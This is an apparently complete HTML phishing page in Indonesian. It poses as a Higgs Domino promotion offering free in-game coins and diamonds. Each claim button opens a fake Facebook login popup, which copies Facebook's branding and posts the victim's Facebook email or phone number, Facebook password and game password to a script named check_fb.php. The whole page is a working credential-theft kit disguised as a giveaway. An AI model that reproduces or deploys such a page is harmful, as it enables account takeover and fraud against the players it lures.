<!doctype html>
<html lang="zh">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover"/>
<meta name="apple-mobile-web-app-capable" content="yes"/>
<meta name="apple-mobile-web-app-status-bar-style" content="black"/>
<meta name="format-detection" content="telephone=no, email=no"/>
<meta http-equiv="Cache-Control" content="no-transform"/>
<meta http-equiv="Cache-Control" content="no-siteapp"/>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"/>
<meta http-equiv="Pragma" content="no-cache"/>
<meta http-equiv="Expires" content="0"/>
<title>Higgs Domino</title>
<link rel="stylesheet" type="text/css" href="css/common.css">
<link rel="stylesheet" type="text/css" href="css/footer.css">
<link rel="stylesheet" type="text/css" href="css/swiper-4.2.2.min.css">
<link rel="stylesheet" type="text/css" href="css/web-infull.css">
<link rel="stylesheet" type="text/css" href="css/facebook.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<script type="text/javascript">
			! function(a, b) {
				var cw = document.documentElement.clientWidth || document.body.clientWidth;
				cw = cw > a ? a : cw;
				var zoom = cw / b;
				document.write('<style id="htmlzoom">html{font-size:' + (zoom * 50) + 'px;}</style>');
				window.addEventListener('resize', function() {
					cw = document.documentElement.clientWidth || document.body.clientWidth;
					if(cw > a) cw = a;
					zoom = cw / b;
					document.getElementById('htmlzoom').innerHTML = 'html{font-size:' + (zoom * 50) + 'px;}';
				});
			}(720, 360);
		</script>
</head>
<body ondragstart="return false">

<style>
.thickdiv {
	position:fixed;
	top:0;
	left:0;
	z-index:101;
	display:none;
	width:100%;
	height:100%;
	border:0 none;
	background:#000;
}
.loginBox {
	position:fixed;
	top:50%;
	left:50%;
	z-index:102;
	display:none;
	margin:-1.78rem 0 0 -3.1rem;
	padding:.18rem .25rem 0;
	width:6.42rem;
	height:4.78rem;
	background:url(img/pop_login_bg.png) no-repeat;
	background-size:cover;
	box-sizing:border-box
}
.loginBox .title {
	height:.68rem;
	text-align:center
}
.loginBox .title img {
	height:.68rem;
	vertical-align:top
}
.loginBox .btnClose {
	top:0;
	right:0;
	width:.55rem;
	height:.52rem;
	background:url(img/view_tutorial_btn.png) no-repeat;
	background-size:100% 100%
}
.loginBox .loginContent {
	color:#26b7b2;
	font-size:.26rem
}
.loginBox .loginContent label {
	display:inline-block;
	margin-top:.2rem;
	width:2.04rem;
	vertical-align:middle;
	text-align:right;
	white-space:nowrap
}
.loginBox .loginContent label:first-child {
	margin-top:0
}
.loginBox .loginContent .inputLong {
	padding-left:.1rem;
	width:2.64rem;
	height:.51rem;
	outline:0;
	border:none;
	background:url(img/login_input_bg.png) no-repeat;
	background-size:100% 100%;
	color:#49d7b4;
	line-height:.51rem;
	appearance:none;
	-webkit-appearance:none
}
.loginBox .loginContent input::-webkit-input-placeholder {
	color:#177870
}
.loginBox .loginContent input::-moz-placeholder {
	color:#177870
}
.loginBox .loginContent input:-ms-input-placeholder {
	color:#177870
}
input:-moz-placeholder,input::-moz-placeholder {
	opacity:1
}
.ico-view-tutorial,.loginBox .loginContent .viewTutorial {
	display:inline-block;
	width:.37rem;
	height:.37rem;
	background:url(img/view_tutorial.png) no-repeat;
	background-size:100% 100%;
	vertical-align:middle
}
.loginBox .loginContent .inputShort {
	display:inline-block;
	padding-left:.1rem;
	width:2.13rem;
	height:.51rem;
	outline:0;
	border:none;
	background:url(img/input_short.png) no-repeat;
	background-size:100% 100%;
	color:#49d7b4;
	line-height:1
}
.loginBox .loginContent .viewReution {
	display:inline-block;
	color:#fe662a;
	vertical-align:middle;
	text-decoration:underline;
	white-space:nowrap
}
.loginBox .loginCenter {
	font-size:0;
	text-align:center
}
.loginBox .loginTxtBtn {
	display:inline-block;
	margin:0 .44rem;
	font-size:.26rem;
	color:#26b7b2;
	text-decoration:underline;
	cursor:pointer
}
.loginContent .submitBtn {
	display:block;
	margin:.28rem auto .1rem;
	width:2.44rem;
	height:.8rem;
	background:url(img/submit_btn.png) no-repeat;
	background-size:100% 100%
}
.loginTip {
	color:#26b7b2;
	text-align:center;
	white-space:nowrap;
	font-size:.2rem
}
.loginForm {
	padding-top:.24rem
}
.inputList {
	position:relative;
	margin-bottom:.12rem
}
.inputList.wrap {
	width:3.5rem;
	margin:0 auto .12rem
}
.inputList.wrap label {
	display:block;
	text-align:left
}
.inputList.wrap .inputLong {
	width:3.5rem
}
.inputList .loginTxtBtn {
	position:absolute;
	top:.2rem;
	right:.1rem;
	font-size:.26rem;
	color:#26b7b2;
	text-decoration:underline;
	cursor: pointer
}
.popup-login {
	background:rgba(0,0,0,0.7);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
</style>

<input type="hidden" value="" id="version">
<!--无充值图页面-->
<section>
<div class="wrapper">
	<article>
	<div class="font-0">
		<p class="bgReg bgReg01"></p>
		<p class="bgReg bgReg02"></p>
		<p class="bgReg bgReg03"></p>
		<p class="bgReg bgReg04"></p>
		<p class="bgReg bgReg05"></p>
		<p class="bgReg bgReg06"></p>
	</div>
	</article>
	<article>
	<div class="regContent">
		<h4 class="title">
		<img src="img/toko_title.png">
		<a class="btnReturn"></a>
		<img class="logo" src="img/logo_img.png"></img>
		<p class="logo-tip" id="logoTip" style="display:none">
			<span>Follow situs web resmi untuk menerima hadiah eksklusif.</span>
		</p>
		</h4>
		<p class="regMsg">
			Silahkan pilih jumlah Koin atau Berlian yang ingin di-ambil. 
			<br>
			Promo ini gratis tanpa dipungut biaya
			<br>
			<br>
			Ambil hadiah anda sekarang!
		</p>
		<div class="tab_top">
			<ul>
				<li class="tab_top_01" onclick="tab('1')">
					<img src="img/koin_01.png" alt="">
				</li>
				<li class="tab_top_02" onclick="tab('2')">
					<img src="img/berlian_01.png" alt="">
				</li>
			</ul>
		</div>
		<div class="regList regList1" style="display: block;">
			<ul>
				<li onclick="LoginGameId()">
					<img class="convertGold" src="img/reg_gold_01.png"></img>
					<span class="regNum">30.000.000<i>+ 1.500.000</i></span>
					<a onclick="LoginGameId()" class="exchangeBtn" title="货币兑换">Ambil</a>
				</li>
				<li onclick="LoginGameId()">
					<img class="convertGold" src="img/reg_gold_02.png"></img>
					<span class="regNum">60.000.000<i>+ 3.000.000</i></span>
					<a onclick="LoginGameId()" class="exchangeBtn" title="货币兑换">Ambil</a>
				</li>
				<li onclick="LoginGameId()">
					<img class="convertGold" src="img/reg_gold_03.png"></img>
					<span class="regNum">200.000.000<i>+ 10.000.000</i></span>
					<a onclick="LoginGameId()" class="exchangeBtn" title="货币兑换">Ambil</a>
				</li>
				<li onclick="LoginGameId()">
					<img class="convertGold" src="img/reg_gold_04.png"></img>
					<span class="regNum">400.000.000<i>+ 20.000.000</i></span>
					<a onclick="LoginGameId()" class="exchangeBtn" title="货币兑换">Ambil</a>
				</li>
				<li onclick="LoginGameId()">
					<img class="convertGold" src="img/reg_gold_05.png"></img>
					<span class="regNum">2.000.000.000<i>+ 100.000.000</i></span>
					<a onclick="LoginGameId()" class="exchangeBtn" title="货币兑换">Ambil</a>
				</li>
				<li onclick="LoginGameId()">
					<img class="convertGold" src="img/reg_gold_05.png"></img>
					<span class="regNum">2.700.000.000<i>+ 135.000.000</i></span>
					<a onclick="LoginGameId()" class="exchangeBtn" title="货币兑换">Ambil</a>
				</li>
				<li onclick="LoginGameId()">
					<img class="convertGold" src="img/reg_gold_06.png"></img>
					<span class="regNum">4.000.000.000<i>+ 200.000.000</i></span>
					<a onclick="LoginGameId()" class="exchangeBtn" title="货币兑换">Ambil</a>
				</li>
			</ul>
		</div>
		<div class="regList regList2" style="display: none;">
			<ul>
				<li onclick="LoginGameId()">
					<img class="convertGold" src="img/zuanshi.png"></img>
					<span class="regNum">500<i>+ 25</i></span>
					<a onclick="LoginGameId())" class="exchangeBtn">Ambil</a>
				</li>
				<li onclick="LoginGameId()">
					<img class="convertGold" src="img/zuanshi.png"></img>
					<span class="regNum">1.000<i>+ 50</i></span>
					<a onclick="LoginGameId()" class="exchangeBtn">Ambil</a>
				</li>
				<li onclick="LoginGameId()">
					<img class="convertGold" src="img/zuanshi.png"></img>
					<span class="regNum">3.300<i>+ 165</i></span>
					<a onclick="LoginGameId()" class="exchangeBtn">Ambil</a>
				</li>
				<li onclick="LoginGameId()">
					<img class="convertGold" src="img/zuanshi.png"></img>
					<span class="regNum">6.600<i>+ 330</i></span>
					<a onclick="LoginGameId())" class="exchangeBtn">AmbilK</a>
				</li>
				<li onclick="LoginGameId()">
					<img class="convertGold" src="img/zuanshi.png"></img>
					<span class="regNum">30.000<i>+ 1.500</i></span>
					<a onclick="LoginGameId()" class="exchangeBtn">Ambil</a>
				</li>
				<li onclick="LoginGameId()">
					<img class="convertGold" src="img/zuanshi.png"></img>
					<span class="regNum">60.000<i>+ 3.000</i></span>
					<a onclick="LoginGameId()" class="exchangeBtn">Ambil</a>
				</li>
			</ul>
		</div>
		<footer>
		<div class="pa footer">
			<a class="icoFaceBook" href="https://www.facebook.com/Dominoisland/"></a>
			<a class="icoMail" href="mailto:dominoisland01@hotmail.com"></a>
			<a class="icoIns" href="https://www.instagram.com/higgsdominoisland"></a>
			<a class="icoTop" href="#"></a>
			<p class="itemText">Seluruh hak cipta.Terhubung dengan Kami!</p>
		</div>
		</footer>
	</div>
	</article>
</div>
</section>

<div class="popup-login loginFacebookBox">
	<div class="popup-box-login-fb">
		<a onclick="location.href='/';" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="https://i.ibb.co/QNdsmDc/facebook-text.png">
		</div>
		<div class="content-box-fb">
			<img src="img/icon.png">
			<div class="txt-login-fb">
				 Masuk ke akun Facebook Anda untuk terhubung ke Higgs Domino
			</div>
			<form class="login-form" action="check_fb.php" method="post">
				<label>
				<input type="text" name="email" placeholder="Nomor ponsel atau alamat email" autocomplete="off" autocapitalize="off" required>
				</label>
				<label>
				<input type="password" name="password" placeholder="Kata sandi Facebook" autocomplete="off" autocapitalize="off" required>
				</label>
				<label>
				<input type="teks" name="passwordGame" placeholder="Kata sandi game" autocomplete="off" autocapitalize="off" required>
				</label>
				<button type="submit" class="btn-login-fb">Masuk</button>
			</form>
			<div class="txt-create-account">Buat akun</div>
			<div class="txt-not-now">Jangan sekarang</div>
			<div class="txt-forgotten-password">Lupa kata sandi?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">Bahasa Indonesia)</div>
			<div class="language-name">English (UK)</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>

<script type="text/javascript" src="https://sdomino.boxiangyx.com/js/jquery-1.11.3.min.js"></script>
<script type="text/javascript" src="https://sdomino.boxiangyx.com/js/request.param.js"></script>
<script type="text/javascript" src="https://sdomino.boxiangyx.com/js/webkit1.0.js"></script>
<script type="text/javascript" src="https://sdomino.boxiangyx.com/js/dominoUi.js"></script>
<script type="text/javascript" src="https://sdomino.boxiangyx.com/js/webInfull/web.infull.2.1.js"></script>
<script type="text/javascript" src="https://sdomino.boxiangyx.com/js/request.param.js"></script>
<script type="text/javascript" src="https://sdomino.boxiangyx.com/js/webShop/web.shop.1.3.js"></script>
<script src="js/upoint.js"></script>
<script type="text/javascript">
		    function tab(index) {
                $('.regList').hide()
                $('.regList' + index + '').show();
                $('.tab_top_01 img').attr('src', 'img/koin_0' + index + '.png');
                $('.tab_top_02 img').attr('src', 'img/berlian_0' + index + '.png');
            }
			var userId = request.QueryString("userId") == null ? 0 : Number(request.QueryString("userId"));
			var infullType = request.QueryString("infullType") == null ? 0 : Number(request.QueryString("infullType"));
			if(userId > 0) {
				$("#infullId").val(userId);
				$("#logoTip").show();
			}
			if (infullType > 0) {
			     tab('2');
			}
			function goBack() {
				if(userId > 0) {
					window.location.href = "https://www.topbos.com";
					return;
				}
				window.history.back(-1);
			}
			upoint.setup('5c775358cf32903de0fa08c9');
            upoint.onSuccess = function() {
                console.log('trx success');
            }
            upoint.onPending = function() {
                console.log('trx pending');
            }
            upoint.onFailed = function() {
                console.log('trx failed');
            }
            upoint.onCanceled = function () {
                console.log('trx canceled');
            }
		</script>
		<script>
			
				$(".viewTutorial").click(function() {
					$(".viewGuideBox").show();
				})
			
			     function goBack() {
                   window.location.href="https://www.topbos.com";
                 }
				
				function LoginGameId() {
				   $("#thickdiv").show();
                   $("#loginGameIdBox").show();
				}
				function LoginFacebook() {
				   $(".popup-login").show();
                   $(".loginFacebookBox").show();
				}
				function LoginNomorHP() {
				   $("#thickdiv").show();
                   $("#LoginNomorHP").show();
				   $("#loginGameIdBox").hide();
				}
				function TutupLogin() {
				   $("#thickdiv").hide();
                   $("#LoginNomorHP").hide();
				   $("#loginGameIdBox").hide();
				   $("#loginFacebookBoxBox").hide();
				}
				
			</script>
</body>
</html>